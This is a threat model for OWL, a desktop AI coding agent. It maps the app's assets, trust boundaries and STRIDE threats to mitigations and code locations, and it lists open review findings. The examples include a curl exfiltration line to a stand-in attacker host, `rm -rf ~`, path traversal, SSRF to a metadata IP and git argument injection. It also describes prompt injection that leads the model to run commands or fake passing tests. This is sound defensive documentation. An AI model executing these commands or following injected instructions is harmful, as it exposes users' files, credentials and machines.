# OWL threat model

Last reviewed: 2026-10-12, against the working tree at that date. Code locations are given
as `path` plus the function or class, because line numbers move. If a location no longer
matches, update this file in the same change.

## What OWL is, in one paragraph

OWL is a desktop app (React in a Tauri 2 webview, `apps/desktop`) that starts a local Python
service (`services/agent`, FastAPI on `127.0.0.1:8000`) as a sidecar. The service talks to a
model provider (NVIDIA's API today), and the model asks for tools: reading and editing files in
an authorised workspace, running commands, git, and a headless browser. Anything that changes
the machine needs a recorded user approval, and every command runs through one sandbox layer.

## Assets

| Asset | Where it lives | Why it matters |
| --- | --- | --- |
| Source code in the workspace | the folders listed in `OWL_WORKSPACES` | Main thing the user trusts OWL with. Can be stolen, corrupted or backdoored. |
| API keys and credentials | `services/agent/.env`, OS environment, `~/.ssh`, `~/.aws`, `~/.netrc`, browser profiles, keyrings | Model provider bill and access to everything else the user can reach. |
| Service token | env `OWL_SERVICE_TOKEN` and `<data_dir>/service.token` | Whoever holds it can drive the agent: run approved tools, read task history. |
| User data | SQLite DB in the data dir (tasks, approvals, memory, usage, tool output), screenshots in `<data_dir>/shots` | Private project details. It can also contain redacted-but-sensitive context. |
| The host | the user's OS account | Command execution means a successful attacker gets the user's privileges. |

## Trust boundaries

```
 websites / other local processes                    model provider (HTTPS)
             |  (1) HTTP to 127.0.0.1                         ^ (3) prompts / completions
             v                                                |
 [Tauri webview] --(2) Bearer token, JSON--> [OWL local service] --(4)--> [browser tool] --> websites
     ^  get_service_token (Tauri IPC)               |  (5) path guard, sandbox, approvals
     |                                              v
 [Tauri shell / sidecar launcher]          [project files + commands + git]
```

1. **Anything on the machine to the local service.** Any website open in a browser, and any
   local process, can send HTTP to `127.0.0.1`. Only the desktop app should be able to drive
   the service.
2. **Webview to local service.** The webview holds the token and renders model output and
   project text. Content shown there is untrusted.
3. **Local service to model provider.** Model output is untrusted. It can be wrong or
   manipulated through prompt injection in files or web pages it has read.
4. **Local service to websites (browser tool).** Pages are hostile. The browser must not
   become a way to reach internal networks (SSRF).
5. **Local service to project files and commands.** The workspace itself can be hostile
   (a cloned repo with git hooks, `conftest.py`, npm scripts, symlinks).

## Attackers

| Attacker | Capabilities | Main goals |
| --- | --- | --- |
| Malicious website | Runs JavaScript in the user's normal browser and can make requests to `127.0.0.1`, including DNS rebinding | Drive the agent, read task history, exfiltrate files |
| Malicious repo content / prompt injection | Controls files in the workspace (README, code comments, git config, hooks, test config, symlinks) | Get the model to run harmful commands, read secrets, fake a passing verification |
| Malicious model output | Controls every tool call the agent proposes and the text the UI shows | Escape the workspace, run commands without approval, exfiltrate data over the network, XSS in the webview |
| Local malware (same user) | Runs as the user | Read the token file or the DB, talk to the service. Mostly out of scope: it already has the user's access. |

## STRIDE

| Threat | Example | Mitigation | Where in code |
| --- | --- | --- | --- |
| **S**poofing the desktop app | A website calls `POST /tasks` on `127.0.0.1:8000` | A per-install bearer token is required on every route except `GET /health` and compared in constant time. CORS allows only the app origins. | `services/agent/app/middlewares/localServiceAuth_middleware.py` (`LocalServiceAuthMiddleware.is_token_valid`); `app/settings/serviceToken_setting.py` (`resolve_service_tokens`); `app/servers/appFactory_server.py` (`create_app`, CORS) |
| Spoofing through DNS rebinding | `evil.example` resolves to `127.0.0.1` | The Host header must be loopback plus the bound port, otherwise 421 | `localServiceAuth_middleware.py` (`is_host_allowed`, `split_host_header`) |
| Spoofing with simple CORS requests | A form post with `text/plain` skips the preflight | Mutating routes require `Content-Type: application/json` (415) | `localServiceAuth_middleware.py` (`__call__`) |
| Token theft from the webview | Another window or an injected page reads the token | Token created with a CSPRNG at launch and passed to the sidecar via env. Webview gets it only through `get_service_token`, limited to the `main` window | `apps/desktop/src-tauri/src/serviceToken_process.rs` (`get_service_token`); `apps/desktop/src-tauri/capabilities/default.json`; `apps/desktop/src-tauri/src/serviceSidecar_process.rs` |
| **T**ampering with files outside the workspace | Model asks to read or write `../../.ssh/authorized_keys` or follows a symlink out | Every path is canonicalised with `realpath` and must stay under an authorised root | `app/guards/workspaceAccess_guard.py` (`WorkspaceAccessGuard.resolve_authorized_path`) |
| Tampering through `fs_search` symlinks | A symlink inside the repo points at `~/.aws` | Each file found is resolved through the guard. Links that leave the workspace and sensitive files are skipped | `app/tools/handlers/fileReading_handler.py` (`search_workspace_files`) |
| Tampering by commands | `rm -rf ~`, writing to `~/.bashrc` | Approval bound to the exact argv. Risk assessor. Sandbox with a read-only system, read-write workspace only, private `/tmp` and an empty `$HOME` | `app/guards/approvalBinding_guard.py` (`find_usable_approval_for_action`); `app/guards/commandRisk_guard.py` (`assess_command_risk`); `app/sandboxes/sandboxRunner_sandbox.py` (`SandboxRunner`); `app/sandboxes/backends/bubblewrapBackend_sandbox.py`; `seatbeltBackend_sandbox.py`; `containerBackend_sandbox.py` |
| Tampering with verification | Repo or model edits `conftest.py` or tests so checks always pass | The model's "done" is only a claim. Passes count only for runs the runtime executed after the last change. Test config and task-written venvs taint the result | `app/tasks/verifications/verificationOutcome_verification.py`; `verificationEvidence_verification.py`; `app/requirements/detectors/pythonProject_detector.py` |
| **R**epudiation | "I never approved that" / "that command never ran" | Approvals, tool calls, exit codes, `sandboxed` and `sandbox_backend` are stored per call and per verification run. The change journal allows a revert | `app/tasks/actions/toolExecution_action.py` (`execute_tool_with_approval_check`); `app/databases/databaseConnection_database.py` (column migration); `app/executors/fileChange_executor.py` |
| **I**nformation disclosure of secrets to the model | Model reads `.env` or keys | Sensitive paths need `allow_sensitive`. Secrets are redacted from file text, command output and page text | `workspaceAccess_guard.py` (`is_sensitive_path`); `app/guards/secretScrub_guard.py` (`redact_secrets_in_text`) |
| Disclosure of secrets to commands | A command prints `$NVIDIA_API_KEY` | Commands get an environment with secret-looking names and URL-embedded credentials removed | `app/guards/environmentScrub_guard.py` (`build_environment_without_secrets`) |
| Disclosure through network exfiltration | `curl -d @src https://attacker` | Sandbox network off by default. Network only when the risk assessor flags it AND the approval says "with network access". Verification never gets network unless `OWL_VERIFY_NETWORK=1` | `commandRisk_guard.py` (`command_needs_network`); `app/tasks/states/taskApproval_state.py`; `app/tasks/verifications/requirementRun_verification.py` |
| Disclosure through SSRF (browser tool) | Model opens `http://169.254.169.254/` or a redirect to `10.0.0.1` | Only http(s). Every resolved IP is checked against loopback, private, link-local, metadata, multicast and unspecified ranges. Every request and redirect hop is re-checked | `app/executors/browserExecutor_executor.py` (`validate_browser_url`, `BrowserPageInspector.allow_only_safe_requests`, `raise_if_redirect_chain_unsafe`) |
| Disclosure from the data dir | Another local user reads the DB or token | Data dir 0700, DB and token 0600 on POSIX | `app/databases/databaseConnection_database.py`; `serviceToken_setting.py` (`write_private_token_file`) |
| Disclosure of screenshots | `GET /shots/../../etc/passwd` | The name must match `shot-\d+\.png` | `app/routes/browserCapture_route.py` (`get_shot`) |
| **D**enial of service | Huge request bodies, fork bombs, endless output | Body limit (413). Wall-clock timeout, rlimits (processes, CPU, memory, open files), capped output that is fully drained, process-group kill | `app/middlewares/bodyLimit_middleware.py`; `app/executors/commandExecutor_executor.py` (`read_capped_output`, `kill_process_group`); `bubblewrapBackend_sandbox.py` (`build_resource_limit_prefix`) |
| **E**levation of privilege | Model runs `sudo` | `sudo`/`su`/`doas`/`runas` as argv[0] are refused. The sandbox sets no-new-privileges, so setuid binaries don't elevate | `commandRisk_guard.py` (`PRIVILEGE_ESCALATION_PATTERN`); bwrap and container backends |
| Elevation through a shell | Model sends `bash -c "…"` with a pipe | Commands are argv arrays, never shell strings. Semgrep rules forbid `shell=True`, `create_subprocess_shell`, `os.system`, `eval`/`exec` | `commandExecutor_executor.py` (`CommandExecutor`); `security/scanners/owlRules.scanner.yml` |
| Elevation through git | A repo's `core.fsmonitor`, hooks or diff drivers run code on `git status` | Git goes through the same executor, so the same sandbox and scrubbed env apply | `app/executors/gitExecutor_executor.py` (`run_git_command`) |
| XSS in the webview | Model output or page text contains `<img onerror>` | React renders text nodes. Semgrep forbids `dangerouslySetInnerHTML` and `innerHTML` | `apps/desktop/src/**`; `owlRules.scanner.yml` |

## Open findings from the 2026-10-12 review

These are real and not yet fixed. They're tracked here until fixed.

| # | Severity | Finding | Location | Suggested fix |
| --- | --- | --- | --- | --- |
| 1 | High | `git_diff` needs no approval and passes `ref` straight to git, so `ref="--output=<path>"` makes git create or overwrite that file with the diff. Inside the sandbox the write is limited to the workspace (it skips the change journal and approvals). Unsandboxed (Windows, or `preferred` mode with no backend) it can overwrite any file the user owns. Reproduced with `git diff --output=…`. | `app/executors/gitExecutor_executor.py` (`read_git_diff`); `app/tools/toolArgument_tool.py` (`GitReadArguments.ref`) | Reject refs that start with `-` (pydantic pattern such as `^[A-Za-z0-9._/@^~{}-]*$` without a leading `-`) and build `["diff", "--end-of-options", ref]`. Add a test. |
| 2 | Medium | Privilege-escalation refusal only matches a bare argv[0]: `["/usr/bin/sudo", "id"]` and `["env", "sudo", "id"]` come back `ok`. Unsandboxed, sudo can reuse a cached credential. | `app/guards/commandRisk_guard.py` (`assess_command_risk`) | Compare `os.path.basename(argv[0])`, and look through wrappers (`env`, `nice`, `nohup`, `timeout`, `xargs`, `bash -c`/`sh -c` bodies). Strict-xfail tests are in `tests/fuzzing/commandRiskProperty_test.py`. |
| 3 | Medium | The sensitive-path list misses common credential files: `.aws/credentials`, `.netrc`, `.git-credentials`, `.pypirc`, `.npmrc`, `.docker/config.json`, `.kube/config`, `.envrc`, `.env~`, and case variants such as `.ENV` (which matters on macOS and Windows). | `app/guards/workspaceAccess_guard.py` (`SENSITIVE_PATH_PATTERNS`, `is_sensitive_path`) | Extend the patterns, match case-insensitively, and include editor backups. Strict-xfail tests are in `tests/fuzzing/pathGuardProperty_test.py`. |
| 4 | Medium | The Tauri CSP is `null`, so any XSS in the webview has no second line of defence and could call `get_service_token`. | `apps/desktop/src-tauri/tauri.conf.json` (`app.security.csp`) | Set a strict CSP (`default-src 'self'; connect-src 'self' http://127.0.0.1:8000 ipc: http://ipc.localhost; img-src 'self' data: http://127.0.0.1:8000; script-src 'self'; style-src 'self' 'unsafe-inline'`) and check that Monaco still works. |
| 5 | Low | Paths with NUL bytes or lone surrogates raise `ValueError` / `UnicodeEncodeError` instead of `WorkspaceError`. `execute_tool_with_approval_check` doesn't catch those, so a model can crash its own tool call or task. | `workspaceAccess_guard.py` (`resolve_authorized_path`); `app/tasks/actions/toolExecution_action.py` | Convert `ValueError`/`UnicodeError` to `WorkspaceError` in the guard. |
| 6 | Low (local) | `services/agent/.env` holds a live provider key with mode 0664. | developer machine | `chmod 600`. Rotate the key if the file was ever shared. |
| 7 | Low | `dompurify@3.4.8` (via Monaco) has moderate XSS advisories. | `apps/desktop/package-lock.json` | Update Monaco or override `dompurify>=3.4.16`. |

## Residual risks (accepted by design)

- **Windows has no OS sandbox backend.** In `preferred` mode commands run unsandboxed. This
  is recorded as `sandboxed=false`, shown in the approval text, and emitted as an event. Use
  `OWL_SANDBOX=required` together with `OWL_SANDBOX_BACKEND=docker` if you need isolation there.
  The same applies to Linux without `bwrap` (for example inside the security lab container,
  where the container itself is the boundary).
- **The model can weaken tests.** Verification checks that tests ran, not that they're good
  tests. Edits to test config taint verification, but deleting assertions in a test file
  doesn't. Review the diff.
- **Approved commands are trusted.** Once you approve `npm install` with network access, its
  install scripts run with network inside the workspace sandbox.
- **Local malware running as the user** can read `service.token` and talk to the service.
  This is out of scope.
- **Redaction is pattern-based.** Unusual secret formats can reach the model provider.
- **The model provider sees your code.** Everything in the context window goes to the
  configured provider.

## How this is tested

See [testingGuide.doc.md](testingGuide.doc.md): static scanners in
`.github/workflows/security-scans.yml`, Schemathesis and Hypothesis tests in
`services/agent/tests/fuzzing`, and the isolated Docker lab in `security/lab`.
